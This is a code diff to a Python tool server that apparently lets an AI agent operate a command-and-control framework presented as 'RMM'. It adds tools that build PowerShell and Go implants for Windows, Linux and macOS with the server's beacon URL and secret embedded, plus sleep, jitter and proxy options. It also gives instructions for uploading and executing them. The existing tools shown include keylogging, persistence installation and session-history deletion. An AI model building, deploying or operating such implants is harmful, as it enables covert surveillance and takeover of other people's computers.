@@ -371,15 +371,17 @@ def tool_queue_upload(
     if not sid:
         return _json_result({"ok": False, "error": "session_not_found"})
     local = Path(local_path).expanduser()
-    if not local.is_file():
+    if not local_path.startswith("artifact:") and not local.is_file():
         return _json_result({"ok": False, "error": "local_file_not_found", "path": str(local)})
-    code, data = client.upload_file(sid, str(local), remote_path)
+    code, data = client.upload_file(sid, local_path if local_path.startswith("artifact:") else str(local), remote_path)
     return _json_result({
         "ok": code == 200,
         "status": code,
         "session_id": sid,
         "local_path": str(local),
         "remote_path": remote_path,
+        "delivery_state": "queued" if code == 200 else "not_confirmed",
+        "note": "Queuing does not confirm delivery. Wait for a new successful agent upload result matching this session and destination via get_events before using the file. Missing results are inconclusive; do not blindly retry.",
         "data": data,
     })
 
@@ -600,6 +602,48 @@ def tool_get_agent_script(client: RmmApiClient) -> str:
     })
 
 
+def tool_deploy_agent_script(
+    client: RmmApiClient,
+    session_id: str = "",
+    sleep_seconds: int = 60,
+    jitter_percent: int = 30,
+    http_proxy: str = "",
+) -> str:
+    """Render a ready-to-run client_rmm.ps1 configured with the server's active beacon URL and secret."""
+    code, data = client.deploy_agent_script(
+        session_id=session_id,
+        sleep_seconds=sleep_seconds,
+        jitter_percent=jitter_percent,
+        http_proxy=http_proxy,
+    )
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_build_go_agent(
+    client: RmmApiClient,
+    goos: str = "windows",
+    goarch: str = "amd64",
+    session_id: str = "",
+    sleep_seconds: int = 60,
+    jitter_percent: int = 30,
+    http_proxy: str = "",
+) -> str:
+    """Build the repository Go agent with the server's active connection settings embedded."""
+    config = {
+        "session_id": session_id,
+        "sleep_seconds": sleep_seconds,
+        "jitter_percent": jitter_percent,
+        "http_proxy": http_proxy,
+    }
+    code, data = client.build_go_agent(
+        goos=goos,
+        goarch=goarch,
+        config=config,
+        use_server_config=True,
+    )
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
 def tool_queue_keylog(client: RmmApiClient, session_ref: str, action: str) -> str:
     act = (action or "").strip().lower()
     if act not in ("start", "stop", "dump"):
@@ -712,6 +756,22 @@ TOOL_HANDLERS = {
     "list_session_downloads": lambda c, a: tool_list_session_downloads(c, a["session_ref"]),
     "list_artifacts": lambda c, a: tool_list_artifacts(c, a.get("kind", "downloads")),
     "get_agent_script": lambda c, a: tool_get_agent_script(c),
+    "deploy_agent_script": lambda c, a: tool_deploy_agent_script(
+        c,
+        a.get("session_id", ""),
+        int(a.get("sleep_seconds", 60)),
+        int(a.get("jitter_percent", 30)),
+        a.get("http_proxy", ""),
+    ),
+    "build_go_agent": lambda c, a: tool_build_go_agent(
+        c,
+        a.get("goos", "windows"),
+        a.get("goarch", "amd64"),
+        a.get("session_id", ""),
+        int(a.get("sleep_seconds", 60)),
+        int(a.get("jitter_percent", 30)),
+        a.get("http_proxy", ""),
+    ),
     "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
     "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
     "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
@@ -1080,7 +1140,7 @@ OPENAI_TOOLS: list[dict] = [
         "type": "function",
         "function": {
             "name": "queue_upload",
-            "description": "Upload a local file (on the MCP host) to a remote path on the agent.",
+            "description": "Queue a local file or artifact_ref upload. Success means queued, not delivered. Record the get_events cursor before queuing, then wait for a new successful upload result matching this session and destination before copying, extracting, or executing. Missing results are inconclusive; do not blindly retry.",
             "parameters": {
                 "type": "object",
                 "properties": {
@@ -1254,6 +1314,34 @@ OPENAI_TOOLS: list[dict] = [
             "name": "clear_history",
             "description": "Permanently delete all archived (ended) session transcripts from disk.",
             "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "deploy_agent_script",
+            "description": "Render a ready-to-run client_rmm.ps1 server-side, configured with the active beacon URL and beacon secret. Returns a portable artifact_ref for queue_upload; the secret is never returned.",
+            "parameters": {"type": "object", "properties": {
+                "session_id": {"type": "string", "description": "Optional fixed session ID; default is generated at first run"},
+                "sleep_seconds": {"type": "integer", "description": "Beacon sleep in seconds (1-3600, default 60)"},
+                "jitter_percent": {"type": "integer", "description": "Beacon jitter percent (0-100, default 30)"},
+                "http_proxy": {"type": "string", "description": "Optional HTTP proxy URL used by the deployed agent"},
+            }},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "build_go_agent",
+            "description": "Build the repository Go agent on the server with the active beacon URL and secret embedded. Returns the portable artifact_ref, server-local path, binary name, size, and SHA-256 for queue_upload.",
+            "parameters": {"type": "object", "properties": {
+                "goos": {"type": "string", "enum": ["windows", "linux", "darwin"], "description": "Target OS (default windows)"},
+                "goarch": {"type": "string", "enum": ["amd64", "arm64"], "description": "Target architecture (default amd64)"},
+                "session_id": {"type": "string", "description": "Optional fixed session ID; default is generated at first run"},
+                "sleep_seconds": {"type": "integer", "description": "Beacon sleep in seconds (default 60)"},
+                "jitter_percent": {"type": "integer", "description": "Beacon jitter percent (default 30)"},
+                "http_proxy": {"type": "string", "description": "Optional HTTP proxy URL used by the deployed agent"},
+            }},
         },
     },
     {
